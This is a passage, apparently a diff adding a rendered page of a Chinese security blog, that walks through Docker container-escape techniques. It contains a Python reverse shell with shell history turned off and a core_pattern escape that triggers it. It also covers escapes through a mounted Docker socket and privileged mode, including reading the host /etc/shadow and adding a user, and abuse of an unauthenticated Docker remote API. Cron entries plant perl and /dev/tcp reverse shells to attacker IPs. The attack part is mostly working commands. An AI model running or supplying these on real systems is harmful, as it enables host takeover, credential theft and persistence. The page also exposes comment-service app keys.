+   s <span class="token operator">=</span> socket.socket<span class="token punctuation">(</span>socket.AF_INET, socket.SOCK_STREAM<span class="token punctuation">)</span>
+   s.connect<span class="token variable"><span class="token punctuation">((</span>lhost<span class="token punctuation">,</span> lport<span class="token punctuation">))</span></span>
+   os.dup2<span class="token punctuation">(</span>s.fileno<span class="token punctuation">(</span><span class="token punctuation">)</span>, <span class="token number">0</span><span class="token punctuation">)</span>
+   os.dup2<span class="token punctuation">(</span>s.fileno<span class="token punctuation">(</span><span class="token punctuation">)</span>, <span class="token number">1</span><span class="token punctuation">)</span>
+   os.dup2<span class="token punctuation">(</span>s.fileno<span class="token punctuation">(</span><span class="token punctuation">)</span>, <span class="token number">2</span><span class="token punctuation">)</span>
+   os.putenv<span class="token punctuation">(</span><span class="token string">"HISTFILE"</span>, <span class="token string">'/dev/null'</span><span class="token punctuation">)</span>
+   pty.spawn<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span>
+   <span class="token comment"># os.remove('/tmp/.t.py')</span>
+   s.close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token builtin class-name">:</span>
+   main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>赋权，写入到目标的 proc 目录下</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> .t.py
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"|/var/lib/docker/overlay2/5717cb9154218ec49579ae338cd1c236694d6a377d61fd6d17e11e49d1b1baad/merged/tmp/.t.py <span class="token entity" title="\r">\r</span>core    "</span> <span class="token operator">></span>  /host/proc/sys/kernel/core_pattern<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>在攻击主机上开启一个监听，然后在容器里运行一个可以崩溃的程序</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>
+   <span class="token keyword">int</span> <span class="token operator">*</span>a  <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+   <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc t.c <span class="token parameter variable">-o</span> t
+./t<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="挂载-Docker-Socket-逃逸"><a href="#挂载-Docker-Socket-逃逸" class="headerlink" title="挂载 Docker Socket 逃逸"></a>挂载 Docker Socket 逃逸</h1><p>在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-it</span> <span class="token parameter variable">-v</span> /:/host ubuntu /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在新的容器内执行 chroot，将根目录切换到挂载到宿主机的根目录，其实不挂载也行</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chroot</span> /host<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h1 id="Privileged-特权模式容器逃逸"><a href="#Privileged-特权模式容器逃逸" class="headerlink" title="Privileged 特权模式容器逃逸"></a>Privileged 特权模式容器逃逸</h1><p>方法一：</p>
+<p>查看挂载磁盘设备</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">fdisk</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在容器内部执行以下命令，将宿主机文件挂载到 &#x2F;test 目录下</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /test <span class="token operator">&amp;&amp;</span> <span class="token function">mount</span> /dev/sda1 /test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>尝试访问宿主机 shadow 文件，可以看到正常访问</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /test/etc/shadow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>也可以在定时任务中写入反弹 shell，不过这个还是老生常谈的分系统</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">$'*/1 * * * * perl -e \'use Socket;$i="172.16.214.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");&#125;;\''</span> <span class="token operator">>></span> /test/var/spool/cron/crontabs/root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>方法二：</p>
+<p>通过新添加的用户登录</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> /dev/sda1 /mnt
+<span class="token function">chroot</span> /mnt adduser john<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<hr>
+<h1 id="Docker-远程-API-未授权访问逃逸"><a href="#Docker-远程-API-未授权访问逃逸" class="headerlink" title="Docker 远程 API 未授权访问逃逸"></a>Docker 远程 API 未授权访问逃逸</h1><p>此事在 <a href="/blog/2025/03/17/CISCN-18st-CCB-2nd%E5%8D%8A%E5%86%B3%E8%B5%9B/#flag02%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89">CISCN 18st &amp; CCB 2nd半决赛</a> 亦有记载</p>
+<p>新运行一个容器，挂载点设置为服务器的根目录挂载至 &#x2F;mnt 目录下</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://<span class="token operator">&lt;</span>target<span class="token operator">></span>:2375/containers/json
+<span class="token function">docker</span> <span class="token parameter variable">-H</span> tcp://<span class="token operator">&lt;</span>target<span class="token operator">></span>:2375 <span class="token function">ps</span> <span class="token parameter variable">-a</span>
+<span class="token function">docker</span> <span class="token parameter variable">-H</span> tcp://10.1.1.211:2375 run <span class="token parameter variable">-it</span> <span class="token parameter variable">-v</span> /:/mnt nginx:latest /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>在容器内执行命令，将反弹 shell 的脚本写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'* * * * * /bin/bash -i >&amp; /dev/tcp/10.1.1.214/12345 0>&amp;1'</span> <span class="token operator">>></span> /mnt/var/spool/cron/crontabs/root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+      </div>
+    </transition>
+    
+    <transition name="fade">
+      <div id="preview" ref="preview" v-show="previewShow">
+        <img id="preview-content" ref="previewContent" />
+      </div>
+    </transition>
+    
+  </div>
+  <script src="/blog/js/main.js"></script>
+  
+  
+
+
+
+
+  
+  
+
+<div id="vcomments"></div>
+<script defer src="/blog/js/lib/valine.min.js" onload="
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+"></script>
+
+
+  <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2026 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
